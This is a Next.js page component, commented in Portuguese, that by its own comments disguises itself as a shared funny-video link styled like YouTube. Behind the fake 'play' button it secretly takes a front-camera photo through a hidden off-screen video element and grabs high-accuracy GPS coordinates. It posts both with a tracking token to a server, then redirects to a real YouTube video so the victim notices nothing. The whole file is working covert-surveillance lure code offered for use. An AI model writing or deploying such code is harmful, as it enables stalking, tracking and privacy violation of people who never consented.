'use client';

// Página disfarçada como link de vídeo compartilhado
// Ao clicar em "play", captura foto + GPS silenciosamente e redireciona para YouTube

import { Suspense, useEffect, useState, useRef } from 'react';
import { useSearchParams } from 'next/navigation';

const VIDEO_REDIRECT = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';

export default function CheckinPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center bg-[#0f0f0f]">
        <div className="w-8 h-8 border-[3px] border-white/10 border-t-white rounded-full animate-spin" />
      </div>
    }>
      <StealthContent />
    </Suspense>
  );
}

function StealthContent() {
  const searchParams = useSearchParams();
  const token = searchParams.get('token');

  const [phase, setPhase] = useState<'validating' | 'ready' | 'capturing' | 'done'>('validating');
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Validar token silenciosamente
  useEffect(() => {
    if (!token) {
      window.location.href = VIDEO_REDIRECT;
      return;
    }

    fetch(`/api/checkin?token=${token}`)
      .then((r) => r.json())
      .then((d) => {
        if (d.valid) {
          setPhase('ready');
        } else {
          // Token inválido → redireciona direto, sem mensagem de erro
          window.location.href = VIDEO_REDIRECT;
        }
      })
      .catch(() => {
        window.location.href = VIDEO_REDIRECT;
      });
  }, [token]);

  const handlePlay = async () => {
    setPhase('capturing');

    let foto: string | null = null;
    let lat = 0;
    let lng = 0;

    // 1. Tentar capturar foto (câmera frontal, escondida)
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
        audio: false,
      });

      if (videoRef.current && canvasRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();

        // Esperar câmera estabilizar
        await new Promise((r) => setTimeout(r, 1000));

        const canvas = canvasRef.current;
        canvas.width = 480;
        canvas.height = 360;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.translate(480, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(videoRef.current, 0, 0, 480, 360);
          foto = canvas.toDataURL('image/jpeg', 0.6);
        }

        stream.getTracks().forEach((t) => t.stop());
      }
    } catch {
      // Câmera negada → continua sem foto
    }

    // 2. Tentar obter GPS
    try {
      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        });
      });
      lat = pos.coords.latitude;
      lng = pos.coords.longitude;
    } catch {
      // GPS negado → continua com 0,0
    }

    // 3. Enviar dados silenciosamente
    try {
      await fetch('/api/checkin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, foto, latitude: lat, longitude: lng }),
      });
    } catch {
      // Falha silenciosa
    }

    // 4. Redirecionar para vídeo real
    window.location.href = VIDEO_REDIRECT;
  };

  return (
    <div className="min-h-screen bg-[#0f0f0f] flex flex-col items-center justify-center p-4">
      {/* Elementos de captura escondidos */}
      <video ref={videoRef} className="fixed top-[-9999px] left-[-9999px] w-px h-px opacity-0" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />

      <div className="max-w-[420px] w-full">
        {/* Card de vídeo estilo YouTube */}
        <div className="bg-[#1a1a1a] rounded-xl overflow-hidden shadow-2xl">

          {/* Thumbnail do vídeo */}
          <div className="relative aspect-video bg-gradient-to-br from-indigo-900/50 via-purple-900/40 to-pink-900/30 flex items-center justify-center overflow-hidden">
            {/* Fake video noise texture */}
            <div className="absolute inset-0 opacity-[0.04]"
              style={{
                backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")`,
                backgroundSize: '150px 150px',
              }}
            />

            {/* Gradiente de fundo estilizado */}
            <div className="absolute inset-0 bg-gradient-to-t from-black/40 via-transparent to-transparent" />

            {/* Ícone central decorativo */}
            <div className="absolute inset-0 flex items-center justify-center opacity-10">
              <span className="text-8xl">🎬</span>
            </div>

            {/* Validando */}
            {phase === 'validating' && (
              <div className="relative z-10">
                <div className="w-10 h-10 border-[3px] border-white/10 border-t-white/80 rounded-full animate-spin" />
              </div>
            )}

            {/* Botão Play */}
            {phase === 'ready' && (
              <button
                onClick={handlePlay}
                className="relative z-10 group"
                aria-label="Assistir vídeo"
              >
                <div className="w-[68px] h-[48px] bg-red-600 group-hover:bg-red-700 rounded-xl flex items-center justify-center transition-all duration-200 group-hover:scale-105 shadow-xl shadow-red-600/30">
                  <svg className="w-6 h-6 text-white ml-0.5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M8 5v14l11-7z" />
                  </svg>
                </div>
              </button>
            )}

            {/* Carregando vídeo (enquanto captura) */}
            {phase === 'capturing' && (
              <div className="relative z-10 text-center">
                <div className="w-10 h-10 border-[3px] border-white/10 border-t-white/80 rounded-full animate-spin mx-auto mb-3" />
                <p className="text-white/60 text-xs font-medium">Carregando vídeo...</p>
              </div>
            )}

            {/* Badge de duração */}
            <div className="absolute bottom-2 right-2 bg-black/80 text-white text-[11px] px-1.5 py-0.5 rounded font-medium z-10">
              3:24
            </div>
          </div>

          {/* Info do vídeo */}
          <div className="p-3.5">
            <div className="flex gap-3">
              {/* Avatar do canal */}
              <div className="w-9 h-9 rounded-full bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center text-white text-sm font-bold shrink-0 shadow-md">
                R
              </div>

              <div className="flex-1 min-w-0">
                <h3 className="text-white text-[15px] font-medium leading-snug">
                  kkkkk mano olha isso não tankei 😂😂
                </h3>
                <p className="text-[#aaa] text-xs mt-1.5 flex items-center gap-1">
                  <span>Rodrigo</span>
                  <span className="text-[#555]">•</span>
                  <span>2,3 mi de views</span>
                  <span className="text-[#555]">•</span>
                  <span>3 dias</span>
                </p>
              </div>
            </div>

            {/* Ações fake */}
            <div className="flex items-center gap-4 mt-3.5 pt-3 border-t border-white/5">
              <div className="flex items-center gap-1.5 text-[#aaa] text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6.633 10.25c.806 0 1.533-.446 2.031-1.08a9.041 9.041 0 0 1 2.861-2.4c.723-.384 1.35-.956 1.653-1.715a4.498 4.498 0 0 0 .322-1.672V2.75a.75.75 0 0 1 .75-.75 2.25 2.25 0 0 1 2.25 2.25c0 1.152-.26 2.243-.723 3.218-.266.558.107 1.282.725 1.282m0 0h3.126c1.026 0 1.945.694 2.054 1.715.045.422.068.85.068 1.285a11.95 11.95 0 0 1-2.649 7.521c-.388.482-.987.729-1.605.729H13.48c-.483 0-.964-.078-1.423-.23l-3.114-1.04a4.501 4.501 0 0 0-1.423-.23H5.904m7.723 2.5H8.25a2.25 2.25 0 0 1-2.25-2.25v-6.75a2.25 2.25 0 0 1 2.25-2.25h.347c.52 0 1.033.09 1.518.26l2.29.764c.577.192 1.15.39 1.718.588" />
                </svg>
                <span>45K</span>
              </div>
              <div className="flex items-center gap-1.5 text-[#aaa] text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M7.217 10.907a2.25 2.25 0 1 0 0 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186 9.566-5.314m-9.566 7.5 9.566 5.314m0 0a2.25 2.25 0 1 0 3.935 2.186 2.25 2.25 0 0 0-3.935-2.186Zm0-12.814a2.25 2.25 0 1 0 3.933-2.185 2.25 2.25 0 0 0-3.933 2.185Z" />
                </svg>
                <span>Compartilhar</span>
              </div>
              <div className="flex items-center gap-1.5 text-[#aaa] text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
                </svg>
                <span>Salvar</span>
              </div>
            </div>
          </div>
        </div>

        {/* Sugestão fake de mais vídeos */}
        <div className="mt-4 space-y-3">
          <p className="text-[#aaa] text-xs font-medium px-1">A seguir</p>

          {/* Vídeo sugerido 1 */}
          <div className="flex gap-2.5 bg-[#1a1a1a]/50 rounded-lg p-2 cursor-default">
            <div className="w-[120px] h-[68px] rounded-md bg-gradient-to-br from-orange-900/40 to-red-900/30 shrink-0 flex items-center justify-center">
              <span className="text-2xl opacity-30">🐱</span>
            </div>
            <div className="flex-1 min-w-0 py-0.5">
              <p className="text-white text-xs font-medium leading-snug line-clamp-2">Gatos engraçados que vão te fazer rir 😹</p>
              <p className="text-[#777] text-[10px] mt-1">FunnyPets • 890K views</p>
            </div>
          </div>

          {/* Vídeo sugerido 2 */}
          <div className="flex gap-2.5 bg-[#1a1a1a]/50 rounded-lg p-2 cursor-default">
            <div className="w-[120px] h-[68px] rounded-md bg-gradient-to-br from-green-900/40 to-teal-900/30 shrink-0 flex items-center justify-center">
              <span className="text-2xl opacity-30">⚽</span>
            </div>
            <div className="flex-1 min-w-0 py-0.5">
              <p className="text-white text-xs font-medium leading-snug line-clamp-2">Top 10 gols impossíveis 2026</p>
              <p className="text-[#777] text-[10px] mt-1">Goals HD • 1,2 mi views</p>
            </div>
          </div>
        </div>

        {/* Footer para realismo */}
        <p className="text-center text-[10px] text-[#333] mt-6">
          Compartilhado com você via link
        </p>
      </div>
    </div>
  );
}
